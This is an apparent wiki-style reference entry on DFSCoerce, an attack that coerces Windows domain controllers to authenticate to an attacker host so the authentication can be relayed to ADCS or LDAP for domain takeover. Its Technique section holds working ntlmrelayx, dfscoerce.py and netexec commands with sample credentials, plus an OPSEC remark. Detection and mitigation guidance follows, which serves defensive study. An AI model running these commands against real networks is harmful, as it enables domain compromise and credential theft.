---
title: DFSCoerce
slug: dfscoerce
---

> **TL;DR:** Any authenticated domain user can call MS-DFSNM `NetrDfsRemoveStdRoot` / `NetrDfsAddStdRoot` against a domain controller to force it to authenticate to an attacker host — feeding NTLM relay chains into ADCS or LDAP for domain takeover.

## What it is
MS-DFSNM is the Distributed File System Namespace Management RPC interface, exposed over the `\pipe\netdfs` named pipe on every domain controller (the DFS service is always running on DCs). Filip Dragovic showed in 2022 that the `NetrDfsRemoveStdRoot` and `NetrDfsAddStdRoot` opnums accept a UNC `ServerName` and cause the DC to contact it, leaking the DC computer account's authentication. Unlike PetitPotam (MS-EFSRPC), DFSCoerce works only against DCs, but it requires only an authenticated user — no special privilege.

## Preconditions / where it applies
- Any valid domain credentials (user, machine, low-priv service)
- Network reach to TCP 445 on a DC and a listener the DC can reach back on
- Useful chained with [[ntlm]] relay to ADCS Web Enrollment ([[adcs-attacks]] ESC8) or LDAP for [[resource-based-constrained-delegation]]

## Technique
Stand up a relay (`ntlmrelayx` to `http://ca/certsrv/certfnsh.asp` with `--template DomainController`), then trigger the DC. The DC machine account authenticates to the relay, the relay requests a cert as the DC, and the attacker uses it for S4U2Self / [[dcsync]].

```bash
# attacker — relay
impacket-ntlmrelayx -t http://CA01/certsrv/certfnsh.asp -smb2support \
    --adcs --template DomainController

# attacker — coerce DC01 to authenticate to RELAYHOST
python3 dfscoerce.py -u alice -p 'Passw0rd!' -d corp.local RELAYHOST DC01

# alternative
netexec smb DC01 -u alice -p 'Passw0rd!' -M dfscoerce -o LISTENER=RELAYHOST
```

OPSEC: the RPC call is short-lived and produces no LSASS interaction on the attacker side — but the DC will log an outbound SMB connection to the listener. See [[ntlm-relay-ws2025-mitigations]].

## Detection and defence
- 4624 logon type 3 to attacker host with the DC's computer account as principal
- RPC filters blocking the `netdfs` interface UUID `4fc742e0-4a10-11cf-8273-00aa004ae673` for non-admins (`netsh rpc filter`)
- Enforce EPA + LDAP/HTTPS channel binding on ADCS, require SMB signing, and enable Extended Protection on AD CS Web Enrollment; disable NTLM where possible

## References
- [The Hacker Recipes — MS-DFSNM abuse (DFSCoerce)](https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications/ms-dfsnm) — protocol-level walkthrough
- [Wh04m1001/DFSCoerce (GitHub)](https://github.com/Wh04m1001/DFSCoerce) — original PoC implementing both opnums
